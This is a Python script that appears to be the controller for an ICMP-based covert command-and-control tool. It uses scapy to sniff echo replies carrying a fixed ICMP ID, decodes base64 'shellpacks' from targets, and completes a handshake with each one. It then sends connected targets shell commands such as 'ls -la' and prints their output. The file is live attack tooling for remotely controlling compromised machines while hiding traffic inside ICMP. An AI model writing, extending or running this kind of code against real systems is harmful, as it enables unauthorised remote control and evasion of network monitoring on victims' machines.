#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import base64
from multiprocessing import Manager, Process
from multiprocessing.managers import BaseManager
import json
import ast
from shelly import Host, Target
import shelly

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.targets = []

    def get_targets(self):
        return self.targets

    def sniff_callback(self, packet):
        # Parses out things that shouldn't be there

        if packet[ICMP].type != 0:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        print(f" $ {unpacked['command']} received from {unpacked['ip']} > {unpacked['message']}")

        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                print(f"Instruction Response:\n{unpacked['data']}")
            case _:
                print("Default case")

    def join(self, shellpack):
        match shellpack['message']:
            case "hello":
                target = Target(shellpack)
                target.update_status("SHAKING")
                self.targets.append(target)
                response_shellpack = shelly.build_shellpack(self, "join", "how are you")
                shelly.send(target.ip, response_shellpack)
            case "fine thank you":
                for target in self.targets:
                    if target.ip == shellpack['ip']:
                        target.update_status("CONNECTED")
                        instruction_shellpack = shelly.build_shellpack(self, "instruction", "request", base64.b64encode("ls -la".encode()))
                        print(instruction_shellpack)

                        shelly.send(target.ip, instruction_shellpack)

        return

if __name__ == "__main__":

    print("[ Setting up controller ]")
    controller = Controller()
    print(controller)

    print("[ Starting sniffer ]")
    sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
